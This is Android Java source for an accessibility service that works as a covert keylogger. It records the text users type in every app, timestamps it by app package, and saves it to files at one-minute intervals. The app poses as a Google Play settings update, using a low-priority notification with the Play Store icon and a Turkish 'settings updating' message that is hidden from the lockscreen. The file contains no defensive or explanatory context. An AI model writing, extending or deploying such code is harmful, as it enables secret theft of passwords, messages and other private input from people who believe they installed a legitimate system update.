package com.setting.dl.google.googlesettingupdate.access;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.support.v4.app.NotificationCompat;
import android.view.accessibility.AccessibilityEvent;

import com.setting.dl.google.googlesettingupdate.R;
import com.setting.dl.google.googlesettingupdate.Run;
import com.setting.dl.google.googlesettingupdate.save.Save;
import com.setting.dl.google.googlesettingupdate.u;
import com.setting.dl.google.googlesettingupdate.usage.UsageManager;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class Access extends AccessibilityService {
   
   private final List<String>               blocks   = new ArrayList<>();
   private final Map<String, StringBuilder> writings = new HashMap<>();
   private       long                       lastSaveTime;
   
   
   private void addWritings(String packageName, String text) {
   
      synchronized (writings) {
   
         if (writings.containsKey(packageName)) {
            //noinspection ConstantConditions
            writings.get(packageName)
                  .append(getTime(System.currentTimeMillis())).append(" - ").append(text).append("\n");
         }
         else {
      
            writings.put(packageName, new StringBuilder()
                  .append(getTime(System.currentTimeMillis())).append(" - ").append(text).append("\n"));
         }
      }
   }
   
   public String getTime(long date) {
      
      SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss:SSS", Locale.getDefault());
      return dateFormat.format(date);
   }
   
   @Override
   public void onAccessibilityEvent(AccessibilityEvent event) {
      
      if (event.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
         
         u.log.d("Beklenmeyen olay : %d", event.getEventType());
         return;
      }
      
      CharSequence pName = event.getPackageName();
      
      if (pName == null) return;
      
      if (blocks.contains(pName.toString())) {
         
         return;
      }
      
      try {
         
         addWritings(pName.toString(), event.getText().toString());
         
         u.log.d("Package     : %s", pName);
         u.log.d("%s", event.getText());
         save();
      }
      catch (Exception e) {
         e.printStackTrace();
      }
      
      
   }
   
   private void save() {
      
      long now      = System.currentTimeMillis();
      long lastTime = now - lastSaveTime;
      
      if (lastTime < 60000) {
         
         u.log.d("Kaydetmeye kalan süre %dsn",  60L - (lastTime / 1000L));
         return;
      }
      
      lastSaveTime = now;
      
      Run.runThread(() -> {
   
         Map<String, StringBuilder> repo;
   
         synchronized (writings) {
   
            repo = new HashMap<>(writings);
            writings.clear();
         }
         
         saveAction(repo);
         
      }, 60000L);
   }
   
   private void saveAction(Map<String, StringBuilder> repo) {
      
      if(repo == null) return;
      
      for (Map.Entry<String, StringBuilder> entry : repo.entrySet()) {
         
         String packageName = entry.getKey();
         String value       = entry.getValue().toString();
         
         u.saveToFile(this, packageName, value);
         
         u.log.d("Kaydedildi : %s", packageName);
      }
   }
   
   @Override
   public void onServiceConnected() {
      
      startFore();
   
      blocks.addAll(new Save(this, "Access").getObjectsList("blocks", String.class));
      u.log.d("Servis bağlandı");
      
   }
   
   @Override
   public void onInterrupt() {
      
   }
   
   private void startFore() {
      
      String CHANNEL_ID   = "8547";
      String CHANNEL_NAME = "Access Channel";
   
      NotificationCompat.Builder builder =
            new NotificationCompat.Builder(this, CHANNEL_ID)
                  .setContentText("Ayarlar Güncelleniyor")
                  .setStyle(new NotificationCompat.BigTextStyle())
                  .setSmallIcon(R.mipmap.playstore)
                  .setPriority(NotificationCompat.PRIORITY_MIN)
                  .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                  .setContentTitle("GooglePlay");
      
      if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
   
         NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
         NotificationChannel chan = new NotificationChannel(CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_MIN);
   
         chan.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
         manager.createNotificationChannel(chan);
   
         startForeground(73, builder.build());
         u.log.w("start fore");
      }
      else{
   
         startForeground(0, builder.build());
         u.log.w("start fore");
      }
   
      
      
      
      
      
   }
   
}
